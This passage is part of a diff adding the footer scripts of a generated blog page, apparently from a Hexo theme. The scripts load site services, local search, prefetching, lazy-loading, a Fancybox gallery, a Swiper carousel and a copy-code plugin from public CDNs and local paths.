+      applyTheme(theme)
+    }
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
